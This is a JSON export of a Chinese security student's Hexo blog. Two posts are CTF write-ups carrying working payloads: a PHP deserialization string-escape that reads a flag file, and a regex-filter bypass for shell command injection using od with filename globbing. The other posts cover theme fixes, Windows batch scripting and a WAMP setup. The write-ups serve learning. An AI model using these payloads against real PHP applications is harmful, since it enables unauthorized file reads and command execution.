{"meta":{"title":"Hexo","subtitle":"","description":"","author":"vvmdx","url":"https://vvmdx.github.io","root":"/"},"pages":[{"title":"","date":"2021-07-13T08:51:14.047Z","updated":"2021-07-13T08:47:53.457Z","comments":true,"path":"baidu_verify_code-ElhKiUUMYo.html","permalink":"https://vvmdx.github.io/baidu_verify_code-ElhKiUUMYo.html","excerpt":"","text":"a634d750ec3ecf877288a10730990c54"},{"title":"分类","date":"2021-08-31T10:42:32.275Z","updated":"2021-07-13T08:22:51.146Z","comments":false,"path":"categories/index.html","permalink":"https://vvmdx.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-09-19T05:22:42.757Z","updated":"2021-07-13T08:22:51.147Z","comments":false,"path":"tags/index.html","permalink":"https://vvmdx.github.io/tags/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-07-14T03:14:08.651Z","updated":"2021-07-13T08:22:51.146Z","comments":false,"path":"repository/index.html","permalink":"https://vvmdx.github.io/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"2019安洵杯easy_serialize_php","slug":"2021-11-14-2019安洵杯easy_serialize_php","date":"2021-11-13T16:00:00.000Z","updated":"2021-11-14T13:36:56.310Z","comments":true,"path":"2021/11/14/2021-11-14-2019安洵杯easy_serialize_php/","link":"","permalink":"https://vvmdx.github.io/2021/11/14/2021-11-14-2019%E5%AE%89%E6%B4%B5%E6%9D%AFeasy_serialize_php/","excerpt":"","text":"2019安洵杯easy_serialize_php buuoj和xctf都有，但是很离谱的一个开不出环境，一个开了环境访问不了phpinfo。。。不知道是平台的问题还是怎样（后来发现buuoj的除了phpinfo看不了其他都正常，妈的绝了） 最后直接clone了题目的docker自己跑 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 代码审计 GET请求参数f的值 highlight_file: index.php phpinfo: phpinfo() show_image: 把$_SESSION序列化后经过filter过滤，再反序列化，最后打印base64解码后的img属性 img_path: 若存在，则进行base64编码和sha1哈希后赋值给$_SESSION[“img”]；若不存在，则将guest_img.png base64编码后赋值给$_SESSION[“img”] 看一眼phpinfo() 找到一个疑似可能有flag或者hint的页面d0g3_f1ag.php extract($_POST) extract() 函数从数组中将变量导入到当前的符号表。 extract第二个参数用来指定当出现冲突时应该怎么做，默认是EXTR_OVERWRITE 即覆盖变量 若选择EXTR_SKIP，则不覆盖 这道题我们只要知道我们传的数组会覆盖掉原来的值就行了，结合后面分析$_SESSION应该是通过这个地方的POST赋值的 $_SESSION有三个元素 user=guest function=$function 可控 img: 取决于GET的参数 要注意$_SESSION无法直接通过赋值控制，因为unset($_SESSION);会把SESSION销毁 思路 1234else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 这几行是重点 GET传?f=show_image；POST传`$_SESSION` $serialize_info = filter(serialize($_SESSION)); $_SESSION序列化后经过过滤器将一些字符串过滤，然后反序列化后赋给$userinfo $_SESSION -&gt; 序列化 -&gt; 过滤 -&gt; 反序列化 -&gt; $userinfo 打开$_userinfo 的img属性的值经过base64解码后的文件名对应的文件，我们这里选择d0g3_f1ag.php看看里面有什么 反序列化字符串逃逸 关键点在于file_get_contents(base64_decode($userinfo['img']))，如果按照正常的流程，img属性的值为guest_img.png的base64编码，我们需要令其为d0g3_f1ag.php的base64编码。 由于filter过滤器是对序列化后的内容进行过滤，是一种典型的长变短反序列化字符串逃逸 可以看到出现flag的地方都会被替换为空，导致长度不符反序列化出错 如果直接把d0g3_f1ag.php的base64编码直接作为img参数传递的话，会发现img属性的值被替换为guest_img.php 因此我们需要序列化字符串在反序列化时，读取到s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;前，让反序列化结束，同时读取到img=ZDBnM19mMWFnLnBocA==（d0g3_f1ag.php的base64编码） 先随便赋个值尝试一下 发现在没有过滤的情况下多了一个属性 我们知道php反序列化的分隔符为 ;} ，当读到这里时反序列化结束，因此我们需要伪造一个分隔符，在分隔符前构造img=ZDBnM19mMWFnLnBocA==的payload 可以看到灰色部分就是我们需要的内容，接下来就要利用序列化字符串的flag会被过滤的特性让前面的内容作为“值”被覆盖 先简单尝试一下 经过过滤后变为a:2:&#123;s:4:&quot;&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;，可以看到第一个s长度为4，所以读到&quot;;s:就结束了，导致反序列化出错 我们计算出需要覆盖的内容&quot;;s:40:长度为7，刚好flag和php两个被过滤的字符串长度和为7 重新尝试_SESSION[flagphp]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; 发现还是不对，这是因为长度7虽然覆盖了那几个字符串，但是他只是把&quot;;s:40:作为属性名而已，还缺少了属性值，因此还要在后面给他加上属性值 继续构造payload，属性值其实就无所谓了，因为不影响前后的构造_SESSION[flagphp]=;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; 可以发现终于成功了 把payload丢到buuoj的靶机上，查看源代码即可发现hint 最后一步就把d0g3_f1ag.php的base64编码换为/d0g3_fllllllag的base64编码即可 答案 payload1 _SESSION[flagphp]=;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; payload2 _SESSION[flagphp]=;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125; 做的过程还遇到一个小坑：burp2021的重放模块，不知道为什么，post数据没经过url编码的话会导致post错内容 没有url编码的情况 发现值没有被修改 有url编码的情况 值正常修改 这次遇到的是中括号[]引起的，其他符号不知道会不会也这样，搞了好久还一直以为是自己做法有问题，，，直到发现hackbar没问题才意识到是burp的问题 本题测试代码 1234567891011121314151617181920212223242526272829&lt;?phpfunction filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;//$var1 = base64_encode(&#x27;d0g3_f1ag.php&#x27;);$var1 = base64_encode(&#x27;/d0g3_fllllllag&#x27;);//echo $var1;$_SESSION[&#x27;img&#x27;] = $var1;//echo serialize($_SESSION).&quot;&lt;br/&gt;&quot;;//$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;//$_SESSION[&#x27;function&#x27;] = &#x27;show_image&#x27;;//$_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);extract($_POST);if(!@$_GET[&quot;img_path&quot;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;echo serialize($_SESSION).&quot;&lt;br/&gt;&quot;;$serialize_info = filter(serialize($_SESSION));echo $serialize_info.&#x27;&lt;br/&gt;&#x27;;$userinfo = unserialize($serialize_info);var_dump($userinfo);echo &#x27;&lt;br/&gt;&#x27;;echo base64_decode($userinfo[&#x27;img&#x27;]);","categories":[{"name":"CTF","slug":"CTF","permalink":"https://vvmdx.github.io/categories/CTF/"}],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://vvmdx.github.io/tags/WriteUp/"}]},{"title":"Hexo搭建pure主题博客若干问题","slug":"2021-11-02-Hexo搭建pure主题博客若干问题","date":"2021-11-01T16:00:00.000Z","updated":"2021-11-02T09:03:04.979Z","comments":true,"path":"2021/11/02/2021-11-02-Hexo搭建pure主题博客若干问题/","link":"","permalink":"https://vvmdx.github.io/2021/11/02/2021-11-02-Hexo%E6%90%AD%E5%BB%BApure%E4%B8%BB%E9%A2%98%E5%8D%9A%E5%AE%A2%E8%8B%A5%E5%B9%B2%E9%97%AE%E9%A2%98/","excerpt":"","text":"Hexo搭建pure主题博客若干问题 ​ 今天本来是打算看下次组会汇报的论文的，看了半个早上实在头大，开始逛起了github，突然想到我的博客一些bug和样式问题之前因为懒得翻前端代码一直没管，于是乎决定动手把博客一些功能给完善一下 ​ 话说为了确保不是自己之前乱改出的问题，我还把原项目重新clone了一份对比… 首页页脚翻页标签问题 在首页的卡片数量超过10个后，就开始需要翻页，但是在上一页和下一页的地方，会出现标签&lt;i class=&quot;icon icon-angle-left&quot;&gt;&lt;/i&gt;没有被解析的情况 解决： 位置：…/theme/pure/layout/_partial/pagination.ejs 左边为改完结果，右边为原版 1234567&lt;%- paginator(&#123; prev_text: &#x27;&lt;%- paginator(&#123; prev_text: &#x27;&lt;i class=&quot;icon icon-angle-left&quot;&gt;&lt;/i&gt; &#x27; + __(&#x27;pagination.prev&#x27;), next_text: __(&#x27;pagination.next&#x27;) + &#x27; &lt;i class=&quot;icon icon-angle-right&quot;&gt;&lt;/i&gt;&#x27; &#125;) %&gt; &#x27; + __(&#x27;pagination.prev&#x27;), next_text: __(&#x27;pagination.next&#x27;) + &#x27; &lt;i class=&quot;icon icon-angle-right&quot;&gt;&lt;/i&gt;&#x27;&#125;) %&gt; 原来的这段选择器用字符标签拼接，在当前页有下一页的时候，在“ 下一页 ”后显示一个“ &gt; ”的图标，在当前页有上一页时，在“ 上一页 ”前显示一个“ &lt; ”的图标，但是实际上这里没有被解析出来，导致最终&lt;i class=&quot;icon icon-angle-left&quot;&gt;&lt;/i&gt;整句会被直接打印到页面，这里的解决方式也直接简单粗暴，把两个标签去掉就行了，虽然这样会导致不够美观，，，但是毕竟不影响使用，这个坑等以后再继续填了 不蒜子计数问题 不蒜子的计数官网描述如下： 引入busuanzi.js 12&lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt; 安装标签 12345678// pv的方式，单个用户连续点击n篇文章，记录n次访问量&lt;span id=&quot;busuanzi_container_site_pv&quot;&gt; 本站总访问量&lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;/span&gt;次&lt;/span&gt;// uv的方式，单个用户连续点击n篇文章，只记录1次访客数&lt;span id=&quot;busuanzi_container_site_uv&quot;&gt; 本站访客数&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;/span&gt;人次&lt;/span&gt; 在pure里的问题：其实在pure里面没什么问题，，，，因为pure的作者做的不蒜子是放在单篇文章里的，而我把全站的访问量给提了出来，放在左侧边栏的底部，效果如下 但是这会出现一个问题：只有“首页”这个选项卡有这个，“归档”、“标签”这些选项卡都没有，于是修改下面的配置 位置：…/theme/pure/layout/_common/footer.ejs 左边为改完的，右边为原版 添加了如下代码，其实也就是和官网的用法一样了，引入js后，添加两个标签 123456789101112&lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;&lt;%- partial(&#x27;_common/social&#x27;, null, &#123;cache: !config.relative_link&#125;) %&gt;&lt;% if (theme.pv.busuanzi.enable) &#123; %&gt; &lt;span id=&quot;busuanzi_container_site_pv&quot;&gt; 总阅读量：&lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;/span&gt;次 &lt;/span&gt; &lt;br /&gt; &lt;span id=&quot;busuanzi_container_site_uv&quot;&gt; 总访客数：&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;/span&gt;位 &lt;/span&gt; 但是这会导致另一个问题，由于pure本身每个页面就都有不蒜子，因此如果我们直接修改这一个配置的话，会导致我们具体的博客页面访问了两次不蒜子，（听起来好像是涨阅读量的好方法）实际上访问两次后并不会回显到页面上！（我也不知道为什么，可以在你的某篇博客页面上打开开发者工具，选择network选项卡，然后刷新一下页面，你会发现访问了两次busuanzi的接口（下面是一次接口的效果），返回的三个参数site_uv是全站访问人数，page_pv是某篇文章的访问次数，site_pv是全站访问次数 修复方法也很简单，把原版的不蒜子接口注释掉就行了（雾 位置：…/theme/pure/layout/_script/pv.ejs 1234&lt;%# ejs文件用这个东西注释代码 %&gt;&lt;% if (theme.pv.busuanzi.enable) &#123; %&gt; &lt;%# &lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt; %&gt;&lt;% &#125; %&gt; 其他一些暂时没发现大毛病了，，等以后有空再看看怎么优化了，真没想到这一搞一个下午又没了…","categories":[{"name":"学点东西","slug":"学点东西","permalink":"https://vvmdx.github.io/categories/%E5%AD%A6%E7%82%B9%E4%B8%9C%E8%A5%BF/"}],"tags":[{"name":"博客","slug":"博客","permalink":"https://vvmdx.github.io/tags/%E5%8D%9A%E5%AE%A2/"}]},{"title":"Windows批处理","slug":"2021-10-23-Windows批处理","date":"2021-10-22T16:00:00.000Z","updated":"2021-10-23T05:10:16.175Z","comments":true,"path":"2021/10/23/2021-10-23-Windows批处理/","link":"","permalink":"https://vvmdx.github.io/2021/10/23/2021-10-23-Windows%E6%89%B9%E5%A4%84%E7%90%86/","excerpt":"","text":"Windows批处理 本来只打算抄个批处理的脚本做windows下jdk版本的快速切换，在写的时候发现了批处理脚本和语法还挺有趣的，感觉有些甚至可以应用到安全中，遂记录下一些有趣的东西 https://github.com/vvmdx/changeYourJDK 这是我编写的批处理切换jdk的脚本 用户变量和系统变量 一般来说windows的环境变量包括了用户变量和系统变量，用户变量对当前的用户起作用，系统变量对所有用户起作用 一般的环境变量优先级是用户变量 &gt; 系统变量，也就是说会优先从用户变量中寻找值，找不到再去系统变量中寻找，举个例子： 可以看到对于用户变量和系统变量中都出现的TEMP和TMP变量，若当前为用户权限，则会先在用户变量中寻找对应的值，若在用户变量中找不到，例如windir，则会去系统变量中查找 而Path这个变量比较奇葩，他是优先从系统变量找起，再找到用户变量，如果你用echo %path%将环境变量打印出来，将会发现打印的顺序是从系统变量Path的第一个开始，一直打印到用户变量Path的最后一个，举个例子： 可以看到，虽然我们打印出来的JAVA_HOME是jdk11.0.3，为用户变量的值，但是java -version显示的是系统变量里的jdk1.8.0_291 总结： 一般来说环境变量调用优先级 用户变量 &gt; 系统变量 Path变量优先级 系统变量 &gt; 用户变量 @echo off @：关闭其后命令的回显 echo off：关闭其他所有命令的回显 pause：用于暂停程序，防止批处理运行完直接退出 当无@echo off指令时 1234echo this is a testecho %JAVA_HOME%where javapause 将以上保存为bat并执行，效果如下，可以看到相当于分别执行了4条指令 当echo off没有@时 12345echo offecho this is a testecho %JAVA_HOME%where javapause 批处理执行如下，可以看到只有第一条指令有回显 当使用@echo off时 12345@echo offecho this is a testecho %JAVA_HOME%where javapause 可以看到@echo off这一行也没了，只有剩下的内容，这正是我们希望的效果 set和setx set和setx都是设置环境变量，不过set只针对于当前的cmd窗口，而setx是直接修改全局（注册表）环境变量 以下是windows对set和setx的描述 1234::set显示、设置或删除 cmd.exe 环境变量。::setx在用户或系统环境创建或修改环境变量。能基于参数、注册表项或文件输入设置变量。 set 当使用set修改环境变量时 可以看到在当前cmd窗口的JAVA_HOME变量已经被修改，这时当我们另开一个cmd窗口时，就会像下面这样 可以发现并没有在全局生效 setx 当使用setx修改环境变量时 1234:: 下面这条只能对用户变量生效setx JAVA_HOME D:\\DevelopTools\\Java\\jdk1.8.0_291:: 加上/M才能对环境变量生效setx JAVA_HOME D:\\DevelopTools\\Java\\jdk1.8.0_291 /M 判断运行当前bat的用户权限 net session net session用于连接、删除或查看本机与其他机器的网络连接，需要管理员权限才可以查看 访问需要管理员权限的路径 %SYSTEMROOT%\\system32\\config\\system md(make directory) &amp; rd(remove directory) 创建目录、删除目录，若目录为系统路径，则需要管理员权限 首先用普通权限创建目录md %windir%\\system32\\aaatestaaa，可以看到拒绝访问 接着用管理员权限创建目录，创建成功 用这个方法虽然也可以判断，但是只能判断一次，因为创建后再次尝试创建时，普通用户和管理员都会返回一样的结果；因此如果要通过此方法判断管理员权限，需要结合rd（删除目录）的指令 上面的是普通用户，下面是管理员用户，其实就是在创建目录后再将其删除，普通用户没权限，管理员创建后会删除，就达到了可以一直进行判断的效果 重定向之&gt;nul &gt; ，&gt;&gt;：输出重定向，echo 123&gt;test.txt将把123输出到文件test.txt中，若文件已存在，则首先删除该文件的信息，再写入123；若文件不存在，则会先创建文件，再写入 &gt;nul：将输出重定向到空，也就是不会打印到dos界面，可以达到屏蔽输出的效果 1&gt;nul：屏蔽正确执行命令的输出 2&gt;nul：屏蔽错误执行命令的输出 可以看到普通用户下net session执行错误，当使用2&gt;nul时屏蔽了错误输出 管理员权限下net session执行成功，当使用1&gt;nul时屏蔽了正确输出 ||与&amp;&amp; &amp;&amp;表示它前面的语句成功执行的话将执行后面的语句 ||表示它之前的语句执行失败将执行后面的语句 两者组和可以实现if…else…的效果 可以看到当普通用户net session执行失败的情况下，使用||就会执行后面的语句；当管理员net session执行成功的情况下，使用&amp;&amp;会执行后面的语句 PsTools 官网下载：https://docs.microsoft.com/en-us/sysinternals/downloads/pstools PsTools是一组能实现安全管理的套件，其中PsExec.exe可以打开system权限的进程 可以看到在开启system权限前，即使是管理员权限的cmd，打印的环境变量也是用户变量；但是system权限的cmd，打印的环境变量已经变成了系统变量","categories":[{"name":"小工具&小脚本","slug":"小工具-小脚本","permalink":"https://vvmdx.github.io/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7-%E5%B0%8F%E8%84%9A%E6%9C%AC/"}],"tags":[{"name":"自编工具&脚本","slug":"自编工具-脚本","permalink":"https://vvmdx.github.io/tags/%E8%87%AA%E7%BC%96%E5%B7%A5%E5%85%B7-%E8%84%9A%E6%9C%AC/"}]},{"title":"Windows+Apache+Mysql+PHP手动搭建","slug":"2021-10-18-Windows+Apache+Mysql+PHP手动搭建","date":"2021-10-17T16:00:00.000Z","updated":"2021-10-18T01:20:43.553Z","comments":true,"path":"2021/10/18/2021-10-18-Windows+Apache+Mysql+PHP手动搭建/","link":"","permalink":"https://vvmdx.github.io/2021/10/18/2021-10-18-Windows+Apache+Mysql+PHP%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BA/","excerpt":"","text":"Windows+Apache+Mysql+PHP手动搭建 ​ 不使用phpStudy、WAMP等集成环境的原因是本机已经装了mysql了，上一台机器在已有mysql的情况下装集成环境造成环境十分混乱，而且集成环境出问题时往往很难定位是哪里出问题，因此打算手动搭建 环境： windows 10 Apache-httpd-2.4.51-win64-VS16 php-8.0.11-Win32-vs16-x64 MySQL Ver 8.0.25 for Win64 on x86_64 Apache搭建 配置文件 Windows下的apache去https://www.apachelounge.com/download/下载压缩包，解压后修改conf/httpd.conf配置文件以下内容 12345Define SRVROOT &quot;D:/DevelopTools/Apache-httpd-2.4.51-win64-VS16/Apache24&quot;DocumentRoot &quot;D:/Programming/php/www&quot;&lt;Directory &quot;D:/Programming/php/www&quot;&gt;ServerName localhostListen 80 ServerRoot 服务器位置，设置为apache在本机的位置 DocumentRoot 作用：确定服务器上访问的位置，即网站文件夹所在位置 &lt;Directory &quot;”&gt; 作用：设置可访问路径，与DocumentRoot一致即可 ServerName 作用：方便用户使用名字访问对应网站，给文件夹对应的取一个别名 去掉注释，端口可以去掉 Listen 作用：设置监听端口 C:\\Windows\\System32\\drivers\\etc\\hosts DNS解析，增加条目127.0.0.1 localhost 启动服务 配置完成后进入安装目录的bin目录下，用管理员身份打开cmd 123456789101112131415# 检查配置是否成果D:\\...\\Apache24\\bin&gt;httpd.exe -tSyntax OK# 启动服务D:\\...\\Apache24\\bin&gt;httpd -k start[Sun Oct 17 16:11:37.803811 2021] [mpm_winnt:error] [pid 27336:tid 408] (OS 2)系统找不到指定的文件。 : AH00436: No installed service named &quot;Apache2.4&quot;.# 若报以上错误则执行以下命令D:\\...\\Apache24\\bin&gt;httpd -k installInstalling the &#x27;Apache2.4&#x27; serviceThe &#x27;Apache2.4&#x27; service is successfully installed.Testing httpd.conf....Errors reported here must be corrected before the service can be started.# 执行成功再启动D:\\...\\Apache24\\bin&gt;httpd -k start# 访问localhost 即可看到页面 PHP环境搭建 官网下载地址：https://windows.php.net/download/ 下载压缩包后解压缩 根目录下的php.exe即为php解释器，命令行运行php.exe -f 文件名即可解析php文件 Apache+PHP Apache加载PHP模块 Apache配置文件httpd.conf添加以下 1234567891011#加载phpLoadModule php_module &#x27;D:/DevelopTools/php-8.0.11/php8apache2_4.dll&#x27;#分配给phpAddType application/x-httpd-php .php# 进入Apache24/bin# 查看语法是否正确D:\\...\\Apache24\\bin&gt;httpd.exe -tSyntax OK# 重启D:\\...\\Apache24\\bin&gt;httpd -k restart 可以看到php已经成功解析 Apache加载PHP配置文件 将php.ini-development原地复制一份，改名为php.ini Apache配置文件添加php配置文件路径 123456789#加载php配置文件，目录到php.ini所在目录即可PHPIniDir &#x27;D:/DevelopTools/php-8.0.11&#x27;# 进入Apache24/bin# 查看语法是否正确D:\\...\\Apache24\\bin&gt;httpd.exe -tSyntax OK# 重启D:\\...\\Apache24\\bin&gt;httpd -k restart 查看配置文件是否已加载 1234&lt;?php echo &quot;hello&quot;; phpinfo();?&gt; 在Loaded Configuration File处看到已经加载了配置文件 时区设定 123# php.inidate.timezone = PRC# 重启Apache 可以看到时区已经设定为中国时区 注意1：由于php的配置文件被加载在Apache中，因此每次对php.ini配置文件的修改都要重启Apache才会生效 注意2：配置文件中的路径要使用斜杠而不是反斜杠！如果直接从电脑复制路径默认是反斜杠，反斜杠会导致加载不了路径！ PHP+MySQL MySQL安装配置就不赘述了… PHP加载MySQL扩展 修改php.ini 1234# 找到这一行，去掉分号注释extension=mysqli# 增加扩展路径extension_dir = &quot;D:/DevelopTools/php-8.0.11/ext&quot; 重启Apache 检查php环境：phpinfo() 可以看到已加载mysql模块 配置虚拟主机 Apache 配置文件httpd.conf 123456# 包含虚拟主机配置文件Include conf/extra/httpd-vhosts.conf# 加载模块，这是Apache2.4的特性，它使用了mod_authz_hosts实现访问控制，同时提供mod_access_compat兼容旧语句LoadModule access_compat_module modules/mod_access_compat.so# 没有上面这行会报错Invalid command &#x27;Order&#x27;, perhaps misspelled or defined by a module not included in the server configuration Apache 虚拟主机配置文件…/Apache24/conf/extra/httpd-vhosts.conf 1234567891011121314151617# 注释掉其他两个没用的，只剩一个&lt;VirtualHost *:80&gt; # 本机目录 DocumentRoot &#x27;D:/Programming/php/www/myTest&#x27; # 虚拟域名 ServerName www.myTest.com # 访问控制 &lt;Directory &quot;D:/Programming/php/www/myTest&quot;&gt; Order Deny,Allow Deny from all Allow from all # 列表显示（开发环境），访问根目录时不会报403 Options Indexes FollowSymLinks # 指定默认访问文件（访问根目录时跳转） DirectoryIndex index.html index.htm index.php &lt;/Directory&gt;&lt;/VirtualHost&gt; DNS解析：修改hosts文件，添加一行：127.0.0.1 www.myTest.com 访问 www.myTest.com，可以看到成功解析 当配置完成后会发现访问localhost也会跳转到这里，此时只要再多配一个虚拟主机即可 到这里就完成所有配置了，关闭Apache服务 123D:\\...\\Apache24\\bin&gt;httpd -k stopThe &#x27;Apache2.4&#x27; service is stopping.The &#x27;Apache2.4&#x27; service has stopped.","categories":[{"name":"系统&工具&环境配置","slug":"系统-工具-环境配置","permalink":"https://vvmdx.github.io/categories/%E7%B3%BB%E7%BB%9F-%E5%B7%A5%E5%85%B7-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}],"tags":[{"name":"环境&工具","slug":"环境-工具","permalink":"https://vvmdx.github.io/tags/%E7%8E%AF%E5%A2%83-%E5%B7%A5%E5%85%B7/"}]},{"title":"2021广东省强网团体赛-wp","slug":"2021-10-16-2021广东省强网团体赛-wp","date":"2021-10-15T16:00:00.000Z","updated":"2021-10-16T12:45:34.319Z","comments":true,"path":"2021/10/16/2021-10-16-2021广东省强网团体赛-wp/","link":"","permalink":"https://vvmdx.github.io/2021/10/16/2021-10-16-2021%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E5%9B%A2%E4%BD%93%E8%B5%9B-wp/","excerpt":"","text":"2021广东省强网团体赛-wp WEB-love_Pokemon 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phperror_reporting(0);highlight_file(__FILE__);$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;if(!file_exists($dir))&#123; mkdir($dir);&#125;function DefenderBonus($Pokemon)&#123; if(preg_match(&quot;/&#x27;| |_|\\\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\\\\\|p|h|u|v|\\\\+|\\\\^|\\`|\\~|\\||\\&quot;|\\&lt;|\\&gt;|\\=|&#123;|&#125;|\\!|\\&amp;|\\*|\\?|\\(|\\)/i&quot;,$Pokemon))&#123; die(&#x27;catch broken Pokemon! mew-_-two&#x27;); &#125; else&#123; return $Pokemon; &#125;&#125;function ghostpokemon($Pokemon)&#123; if(is_array($Pokemon))&#123; foreach ($Pokemon as $key =&gt; $pks) &#123; $Pokemon[$key] = DefenderBonus($pks); &#125; &#125; else&#123; $Pokemon = DefenderBonus($Pokemon); &#125;&#125;switch($_POST[&#x27;myfavorite&#x27;] ?? &quot;&quot;)&#123; case &#x27;picacu!&#x27;: echo md5(&#x27;picacu!&#x27;).md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]); break; case &#x27;bulbasaur!&#x27;: echo md5(&#x27;miaowa!&#x27;).md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]); $level = $_POST[&quot;levelup&quot;] ?? &quot;&quot;; if ((!preg_match(&#x27;/lv100/i&#x27;,$level)) &amp;&amp; (preg_match(&#x27;/lv100/i&#x27;,escapeshellarg($level))))&#123; echo file_get_contents(&#x27;./hint.php&#x27;); &#125; break; case &#x27;squirtle&#x27;: echo md5(&#x27;jienijieni!&#x27;).md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]); break; case &#x27;mewtwo&#x27;: $dream = $_POST[&quot;dream&quot;] ?? &quot;&quot;; if(strlen($dream)&gt;=20)&#123; die(&quot;So Big Pokenmon!&quot;); &#125; ghostpokemon($dream); echo shell_exec($dream);&#125;?&gt; 思路： 当post参数myfavorite=bulbasaur!时，接收一个post参数levelup，经过if判断后可以获得hint 难点：不能被lv100匹配到，又要在escapeshellarg匹配lv100 escapeshellarg作用是转义shell的输入 绕过方法：ascii %80之后的都会被去掉，即escapeshellarg(lv%fa100) -&gt; lv100 payload：myfavorite=bulbasaur!&amp;levelup=lv%fa100 这里讲的很详细 hint提示flag在根目录下，名字叫FLAG 当post参数myfavorite=mewtwo时，接受参数dream，传参到ghostpokemon再传参到DefenderBonus，经过正则后返回参数的值，将dream的参数值作为shell执行 难点：dream的值即为读取flag命令的值，因此要将该shell绕过正则 读取内容的命令： cat /FLAG：a、L、A被过滤了，cat用不了 cat -&gt; od命令：读取内容，输出为八进制，可以用 /FLAG -&gt; /F[0-Z][0-Z]G：[]为文件名通配符，用来匹配指定范围内的任意单个字符 效果如下： payload：myfavorite=mewtwo&amp;dream=od%09/F[0-Z][0-Z]G 读取八进制结果后解码即可 Crypto-RSA and BASE？ 1234567RSA:n=56661243519426563299920058134092862370737397949947210394843021856477420959615132553610830104961645574615005956183703191006421508461009698780382360943562001485153455401650697532951591191737164547520951628336941289873198979641173541232117518791706826699650307105202062429672725308809988269372149027026719779368169e=36269788044703267426177340992826172140174404390577736281478891381612294207666891529019937732720246602062358244751177942289155662197410594434293004130952671354973700999803850153697545606312859272554835232089533366743867361181786472126124169787094837977468259794816050397735724313560434944684790818009385459207329c=137954301101369152742229874240507191901061563449586247819350394387527789763579249250710679911626270895090455502283455665178389917777053863730286065809459077858674885530015624798882224173066151402222862023045940035652321621761390317038440821354117827990307003831352154618952447402389360183594248381165728338233BASE:&quot;GHI45FQRSCX****UVWJK67DELMNOPAB3&quot; 思路： RSA部分 e很大，使用wiener attack，网上有脚本可以用，改下参数即可，github地址 解出d的值 1d=162629853458911971486680889045849898679792335644886630492453366486865526390781 和n、c拿去解密 123456789c=d=n=m=pow(c,d,n)print long_to_bytes(m)----------------------flag&#123;TCMDIEOH2MJFBLKHT2J7BLYZ2WUE5NYR2HNG====&#125; Base部分 